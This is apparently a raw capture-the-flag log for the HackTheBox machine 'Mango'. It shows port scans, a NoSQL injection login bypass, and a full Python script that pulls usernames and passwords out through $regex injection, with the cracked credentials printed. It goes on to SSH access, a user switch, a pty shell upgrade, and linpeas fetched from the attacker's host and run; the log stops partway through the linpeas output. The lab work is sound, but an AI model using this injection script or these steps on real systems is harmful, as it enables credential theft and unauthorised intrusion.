RECON
root@kali:~/htb/mango# nmap -sC -sV -p- -vv -oA  full 10.10.10.162
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXYCdNRHET98F1ZTM+H8yrD9KXeRjvIk9e78JkHdzcqCq6zcvYIqEZReb3FSCChJ9mxK6E6vu5xBY7R6Gi0V31dx0koyaieEMd67PU+9UcjaAujbDS3UgYzySN+c5GV/ssmA6wWHu4zz+k+qztqdYFPh0/TgrC/wNPWHOKdpivgoyk3+F/retyGdKUNGjypXrw6v1faHiLOIO+zNHorxB304XmSLEFswiOS8UsjplIbud2KhWPEkY4s4FyjlpfpVdgPljbjijm7kcPNgpTXLXE51oNE3Q5w7ufO5ulo3Pqm0x+4d+SEpCE4g0+Yb020zK+JlKsp2tFJyLqTLan1buN
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqSZ4iBMzBrw2lEFKYlwO2qmw0WPf76ZhnvWGK+LJcHxvNa4OQ/hGuBWCjVlTcMbn1Te7D8jGwPgbcVpuaEld8=
|   256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB1sFdLYacK+1f4J+i+NCAhG+bj8xzzydNhqA1Ndo/xt
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/emailAddress=admin@mango.htb/organizationalUnitName=None
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/emailAddress=admin@mango.htb/organizationalUnitName=None
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
| SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
| -----BEGIN CERTIFICATE-----
| MIIEAjCCAuqgAwIBAgIJAK5QiSmoBvEyMA0GCSqGSIb3DQEBCwUAMIGVMQswCQYD
| VQQGEwJJTjENMAsGA1UECAwETm9uZTENMAsGA1UEBwwETm9uZTEXMBUGA1UECgwO
| TWFuZ28gUHJ2IEx0ZC4xDTALBgNVBAsMBE5vbmUxIDAeBgNVBAMMF3N0YWdpbmct
| b3JkZXIubWFuZ28uaHRiMR4wHAYJKoZIhvcNAQkBFg9hZG1pbkBtYW5nby5odGIw
| HhcNMTkwOTI3MTQyMTE5WhcNMjAwOTI2MTQyMTE5WjCBlTELMAkGA1UEBhMCSU4x
| DTALBgNVBAgMBE5vbmUxDTALBgNVBAcMBE5vbmUxFzAVBgNVBAoMDk1hbmdvIFBy
| diBMdGQuMQ0wCwYDVQQLDAROb25lMSAwHgYDVQQDDBdzdGFnaW5nLW9yZGVyLm1h
| bmdvLmh0YjEeMBwGCSqGSIb3DQEJARYPYWRtaW5AbWFuZ28uaHRiMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5fimSfgq3xsdUkZ6dcbqGPDmCAJJBOK2
| f5a25At3Ht5r1SjiIuvovDSmMHjVmlbF6qX7C6f7Um+1Vtv/BinZfpuMEesyDH0V
| G/4X5r6o1GMfrvjvAXQ2cuVEIxHGH17JM6gKKEppnguFwVMhC4/KUIjuaBXX9udA
| 9eaFJeiYEpdfSUVysoxQDdiTJhwyUIPnsFrf021nVOI1/TJkHAgLzxl1vxrMnwrL
| 2fLygDt1IQN8UhGF/2UTk3lVfEse2f2kvv6GbmjxBGfWCNA/Aj810OEGVMiS5SLr
| arIXCGVl953QCD9vi+tHB/c+ICaTtHd0Ziu/gGbdKdCItND1r9kOEQIDAQABo1Mw
| UTAdBgNVHQ4EFgQUha2bBOZXo4EyfovW+pvFLGVWBREwHwYDVR0jBBgwFoAUha2b
| BOZXo4EyfovW+pvFLGVWBREwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsF
| AAOCAQEAmyhYweHz0az0j6UyTYlUAUKY7o/wBHE55UcekmWi0XVdIseUxBGZasL9
| HJki3dQ0mOEW4Ej28StNiDKPvWJhTDLA1ZjUOaW2Jg20uDcIiJ98XbdBvSgjR6FJ
| JqtPYnhx7oOigKsBGYXXYAxoiCFarcyPyB7konNuXUqlf7iz2oLl/FsvJEl+YMgZ
| YtrgOLbEO6/Lot/yX9JBeG1z8moJ0g+8ouCbUYI1Xcxipp0Cp2sK1nrfHEPaSjBB
| Os2YQBdvVXJau7pt9zJmPVMhrLesf+bW5CN0WpC/AE1M1j6AfkX64jKpIMS6KAUP
| /UKaUcFaDwjlaDEvbXPdwpmk4vVWqg==
|_-----END CERTIFICATE-----
|_ssl-date: ERROR: Script execution failed (use -d to debug)
| tls-alpn: 
|   http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

ENUM WEB
root@kali:~/htb/forest# sslscan 10.10.10.162
Version: 1.11.11-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)

Connected to 10.10.10.162

Testing SSL server 10.10.10.162 on port 443 using SNI name 10.10.10.162

  TLS Fallback SCSV:
Server supports TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLS 1.2 not vulnerable to heartbleed
TLS 1.1 not vulnerable to heartbleed
TLS 1.0 not vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-GCM-SHA384     DHE 2048 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA256         DHE 2048 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-CAMELLIA256-SHA384  Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA256    DHE 2048 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384            
Accepted  TLSv1.2  256 bits  AES256-SHA256                
Accepted  TLSv1.2  256 bits  AES256-SHA                   
Accepted  TLSv1.2  256 bits  CAMELLIA256-SHA256           
Accepted  TLSv1.2  256 bits  CAMELLIA256-SHA              
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-GCM-SHA256     DHE 2048 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA256         DHE 2048 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-CAMELLIA128-SHA256  Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA256    DHE 2048 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256            
Accepted  TLSv1.2  128 bits  AES128-SHA256                
Accepted  TLSv1.2  128 bits  AES128-SHA                   
Accepted  TLSv1.2  128 bits  CAMELLIA128-SHA256           
Accepted  TLSv1.2  128 bits  CAMELLIA128-SHA              
Preferred TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Accepted  TLSv1.1  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits
Accepted  TLSv1.1  256 bits  AES256-SHA                   
Accepted  TLSv1.1  256 bits  CAMELLIA256-SHA              
Accepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits
Accepted  TLSv1.1  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits
Accepted  TLSv1.1  128 bits  AES128-SHA                   
Accepted  TLSv1.1  128 bits  CAMELLIA128-SHA              
Preferred TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Accepted  TLSv1.0  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits
Accepted  TLSv1.0  256 bits  AES256-SHA                   
Accepted  TLSv1.0  256 bits  CAMELLIA256-SHA              
Accepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits
Accepted  TLSv1.0  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits
Accepted  TLSv1.0  128 bits  AES128-SHA                   
Accepted  TLSv1.0  128 bits  CAMELLIA128-SHA              

  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  staging-order.mango.htb
Issuer:   staging-order.mango.htb

Not valid before: Sep 27 14:21:19 2019 GMT
Not valid after:  Sep 26 14:21:19 2020 GMT

TEST THE STAGING-ORDER LOGIN PAGE FOR NOSQL INJECTION WITH BURP SUITE
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection

REQUEST
POST / HTTP/1.1
Host: staging-order.mango.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://staging-order.mango.htb/
Cookie: PHPSESSID=l8rt66sa9mb3dun3uiehvrbian
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

username[$ne]=admin&password[$ne]=admin&login=login

RESPONSE

CREATE CREDENTIAL BRUTE FORCE SCRIPT
root@kali:~/htb/mango# vim mango.py
root@kali:~/htb/mango# cat mango.py 
#!/usr/bin/python3

import requests
from string import printable, ascii_lowercase

url = "http://staging-order.mango.htb/index.php"

s = requests.Session()

data = {'username[$regex]':'', 'password[$regex]':'', 'login':'login'}

def getUsers():
	users = []
	for i in ascii_lowercase:
		data['username[$regex]'] = '^'+i
		r = s.post(url, data)
		if "home" in r.url:
			currentUser = i
			print(currentUser)
			flag = 0
			while True:
				if flag == 1:
					break
				for j in ascii_lowercase:
					data['username[$regex]'] = '^' + currentUser + j
					r = s.post(url, data)
					if "home" in r.url:
						currentUser += j
						print(currentUser)
						break
					elif j == ascii_lowercase[-1]:
						print("User Found: " + currentUser, end='\n\n')
						flag = 1
						break
			users += [currentUser]
	return users

def getPassword(user):
	escapeCharacters = """!"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"""
	data['username[$regex]'] = user
	currentPassword = ''
	flag = 0
	while True:
		if flag == 1:
			break
		for i in printable:
			if i in escapeCharacters:
				data['password[$regex]'] = '^' + currentPassword + '\\' + i
			else:
				data['password[$regex]'] = '^' + currentPassword + i
			r = s.post(url, data)
			if "home" in r.url:
				currentPassword += i
				print(currentPassword)
				break
			elif i == printable[-1]:
				print("Password Found =======> "+user+':'+currentPassword, end='\n\n')
				flag = 1
				break
	return currentPassword

print("===============USERS====================")
usersFound = getUsers()
print('')

print("================PASSWORD=================")
for user in usersFound:
	password = getPassword(user)
root@kali:~/htb/mango# chmod 744 mango.py 
root@kali:~/htb/mango# python3 mango.py 
===============USERS====================
a
ad
adm
admi
admin
User Found: admin

m
ma
man
mang
mango
User Found: mango


================PASSWORD=================
t
t9
t9K
t9Kc
t9KcS
t9KcS3
t9KcS3>
t9KcS3>!
t9KcS3>!0
t9KcS3>!0B
t9KcS3>!0B#
t9KcS3>!0B#2
Password Found =======> admin:t9KcS3>!0B#2

h
h3
h3m
h3mX
h3mXK
h3mXK8
h3mXK8R
h3mXK8Rh
h3mXK8RhU
h3mXK8RhU~
h3mXK8RhU~f
h3mXK8RhU~f{
h3mXK8RhU~f{]
h3mXK8RhU~f{]f
h3mXK8RhU~f{]f5
h3mXK8RhU~f{]f5H
Password Found =======> mango:h3mXK8RhU~f{]f5H

LOGIN WITH ADMIN OR MANGO CREDENTIALS 
http://staging-order.mango.htb/home.php

TRY SSH LOGIN WITH ADMIN 
root@kali:~/htb/mango# ssh admin@10.10.10.162
The authenticity of host '10.10.10.162 (10.10.10.162)' can't be established.
ECDSA key fingerprint is SHA256:AhHG3k5r1ic/7nEKLWHXoNm0m28uM9W8heddb9lCTm0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.162' (ECDSA) to the list of known hosts.
admin@10.10.10.162's password: 
Permission denied, please try again.
admin@10.10.10.162's password: 
Permission denied, please try again.
admin@10.10.10.162's password: 
admin@10.10.10.162: Permission denied (publickey,password).

SSH ADMIN LOGIN FAILED SO TRY MANGO CREDENTIALS

GET USER SHELL
root@kali:~/htb/mango# ssh mango@10.10.10.162
mango@10.10.10.162's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Dec  9 02:28:51 UTC 2020

  System load:  0.45               Processes:            118
  Usage of /:   26.6% of 19.56GB   Users logged in:      0
  Memory usage: 28%                IP address for ens33: 10.10.10.162
  Swap usage:   0%

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.


Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138


mango@mango:~$ id & hostname & lsb_release -a
[1] 3431
[2] 3432
mango
uid=1000(mango) gid=1000(mango) groups=1000(mango)
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.2 LTS
Release:	18.04
Codename:	bionic
[1]-  Done                    id
[2]+  Done                    hostname

CHECK PERMISSIONS
mango@mango:~$ sudo -l
[sudo] password for mango: 
Sorry, user mango may not run sudo on mango

SWITCH TO USER ADMIN
mango@mango:~$ ls -l /home
total 8
drwxr-xr-x 2 admin admin 4096 Sep 30  2019 admin
drwxr-xr-x 4 mango mango 4096 Sep 28  2019 mango
mango@mango:~$ su admin
Password: 
$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
$ sudo -l
[sudo] password for admin: 
Sorry, user admin may not run sudo on mango.
$ ls -l /home/admin
total 4
-r-------- 1 admin admin 33 Dec  8 22:38 user.txt

GET USER FLAG
$ cat /home/admin/user.txt
###################################

UPGRADE THE SHELL
$ python3 -c "import pty; pty.spawn('/bin/bash');"
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@mango:/home/mango$ 


TRANSFER LINPEAS TO MANGO AND RUN
root@kali:~/htb/mango# cp /root/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh .
root@kali:~/htb/mango# python -m SimpleHTTPServer 80

admin@mango:/home/mango$ wget 10.10.14.8/linpeas.sh
admin@mango:/home/mango$ cd /home/admin
admin@mango:/home/admin$ wget 10.10.14.8/linpeas.sh

admin@mango:/home/admin$ chmod +x linpeas.sh
admin@mango:/home/admin$ ./linpeas.sh
 Starting linpeas. Caching Writable Folders...

                     â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„
             â–„â–„â–„â–„â–„â–„â–„             â–„â–„â–„â–„â–„â–„â–„â–„â–„
      â–„â–„â–„â–„â–„â–„â–„      â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„  â–„â–„â–„â–„â–„
  â–„â–„â–„â–„     â–„ â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„
  â–„    â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„
  â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„â–„â–„â–„       â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„
  â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„          â–„â–„â–„â–„â–„â–„               â–„â–„â–„â–„â–„â–„ â–„
  â–„â–„â–„â–„â–„â–„              â–„â–„â–„â–„â–„â–„â–„â–„                 â–„â–„â–„â–„ 
  â–„â–„                  â–„â–„â–„ â–„â–„â–„â–„â–„                  â–„â–„â–„
  â–„â–„                â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„                  â–„â–„
  â–„            â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„   â–„â–„
  â–„      â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„
  â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„                                â–„â–„â–„â–„
  â–„â–„â–„â–„â–„  â–„â–„â–„â–„â–„                       â–„â–„â–„â–„â–„â–„     â–„â–„â–„â–„
  â–„â–„â–„â–„   â–„â–„â–„â–„â–„                       â–„â–„â–„â–„â–„      â–„ â–„â–„
  â–„â–„â–„â–„â–„  â–„â–„â–„â–„â–„        â–„â–„â–„â–„â–„â–„â–„        â–„â–„â–„â–„â–„     â–„â–„â–„â–„â–„
  â–„â–„â–„â–„â–„â–„  â–„â–„â–„â–„â–„â–„â–„      â–„â–„â–„â–„â–„â–„â–„      â–„â–„â–„â–„â–„â–„â–„   â–„â–„â–„â–„â–„ 
   â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„        â–„          â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„ 
  â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„                       â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„
  â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„                         â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„
  â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„            â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„
   â–„â–„â–„â–„â–„â–„   â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„
        â–„â–„â–„â–„â–„â–„â–„â–„      â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„  â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„ 
             â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„
    linpeas v2.8.7 by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.15.0-64-generic (buildd@lgw01-amd64-038) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #73-Ubuntu SMP Thu Sep 12 13:16:13 UTC 2019
User & Groups: uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
Hostname: mango
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.15.0-64-generic (buildd@lgw01-amd64-038) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #73-Ubuntu SMP Thu Sep 12 13:16:13 UTC 2019
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.2 LTS
Release:	18.04
Codename:	bionic

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.21p2

[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

[+] Date
Wed Dec  9 02:37:27 UTC 2020

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on
udev            955M     0  955M   0% /dev
tmpfs           198M  1.2M  196M   1% /run
/dev/sda2        20G  5.3G   14G  29% /
tmpfs           986M     0  986M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           986M     0  986M   0% /sys/fs/cgroup
/dev/loop0       91M   91M     0 100% /snap/core/6350
/dev/loop1       90M   90M     0 100% /snap/core/7713
tmpfs           198M     0  198M   0% /run/user/1000
              total        used        free      shared  buff/cache   available
Mem:        2017392      253928      482656        3220     1280808     1573280
Swap:       2097148           0     2097148

[+] CPU info
Architecture:        x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
CPU(s):              1
On-line CPU(s) list: 0
Thread(s) per core:  1
Core(s) per socket:  1
Socket(s):           1
NUMA node(s):        1
Vendor ID:           AuthenticAMD
CPU family:          23
Model:               1
Model name:          AMD EPYC 7401P 24-Core Processor
Stepping:            2
CPU MHz:             2000.000
BogoMIPS:            4000.00
Hypervisor vendor:   VMware
Virtualization type: full
L1d cache:           32K
L1i cache:           64K
L2 cache:            512K
L3 cache:            65536K
NUMA node0 CPU(s):   0
Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt xsaveopt xsavec xsaves arat overflow_recov succor

[+] Environment
[i] Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/admin
USER=admin
SSH_CLIENT=10.10.14.8 49234 22
LC_TIME=C.UTF-8
SHLVL=2
HOME=/home/admin/
SSH_TTY=/dev/pts/0
LC_MONETARY=C.UTF-8
LOGNAME=admin
_=./linpeas.sh
XDG_SESSION_ID=13
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/sh
LESSCLOSE=/usr/bin/lesspipe %s %s
LC_MEASUREMENT=C.UTF-8
SSH_CONNECTION=10.10.14.8 49234 10.10.10.162 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
LC_NUMERIC=C.UTF-8
LC_PAPER=C.UTF-8
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmseg
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
 Not Found

[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found
[+] Execshield enabled? ............ Execshield Not Found
[+] SELinux enabled? ............... sestatus Not Found
[+] Is ASLR enabled? ............... Yes
[+] Printer? ....................... lpstat Not Found
[+] Is this a container? ........... No
[+] Any running containers? ........ No


=========================================( Devices )==========================================
[+] Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2

[+] Unmounted file-system?
[i] Check if you can mount umounted devices
UUID=0634a040-6a72-4b9e-ab24-b2d24190f481 / ext4 defaults 0 0
/swap.img	none	swap	sw	0	0


====================================( Available Software )====================================
[+] Useful software
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/base64
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo
/usr/bin/lxc

[+] Installed Compiler
/snap/core/6350/usr/share/gcc-5
/snap/core/7713/usr/share/gcc-5
/usr/share/gcc-8


================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
admin      3489  0.0  0.0   4628   884 pts/0    S    02:32   0:00 sh
admin      3524  0.0  0.4  39108  9836 pts/0    S+   02:34   0:00 python3 -c import pty; pty.spawn('/bin/bash');
admin      3525  0.0  0.2  21320  5072 pts/1    Ss   02:34   0:00 /bin/bash
admin      3597  0.1  0.1   5100  2228 pts/1    S+   02:37   0:00 /bin/sh ./linpeas.sh
admin      4190  0.0  0.1  38392  3736 pts/1    R+   02:37   0:00 ps aux
admin      4192  0.0  0.0  14760  1032 pts/1    S+   02:37   0:00 sort
daemon[0m      984  0.0  0.1  28332  2504 ?        Ss   Dec08   0:00 /usr/sbin/atd -f
mango      3270  0.0  0.3  76644  6892 ?        Ss   02:28   0:00 /lib/systemd/systemd --user
mango      3281  0.0  0.1 259224  2464 ?        S    02:28   0:00 (sd-pam)
mango      3395  0.0  0.2 108120  5480 ?        S    02:28   0:00 sshd: mango@pts/0
mango      3398  0.0  0.2  23348  5540 pts/0    Ss   02:28   0:00 -bash
message+    997  0.0  0.2  50052  4644 ?        Ss   Dec08   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
mongodb     980  0.3  3.9 1130292 80644 ?       Ssl  Dec08   0:48 /usr/bin/mongod --config /etc/mongod.conf
root          1  0.0  0.4 225240  8992 ?        Ss   Dec08   0:02 /sbin/init auto automatic-ubiquity noprompt
root       1015  0.0  1.0 185932 20212 ?        Ssl  Dec08   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       1022  0.0  0.0 613196  1660 ?        Ssl  Dec08   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       1040  0.0  0.3  72296  6432 ?        Ss   Dec08   0:00 /usr/sbin/sshd -D
root       1042  0.0  0.0  14888  1996 tty1     Ss+  Dec08   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       1060  0.0  0.3 288880  6560 ?        Ssl  Dec08   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       1086  0.0  1.0 393384 20740 ?        Ss   Dec08   0:01 /usr/sbin/apache2 -k start
root       3483  0.0  0.1  63476  3780 pts/0    S    02:32   0:00 su admin
root        430  0.0  0.5 126852 11176 ?        Ss   Dec08   0:08 /usr/bin/vmtoolsd
root        432  0.0  0.9 128360 18748 ?        S<s  Dec08   0:00 /lib/systemd/systemd-journald
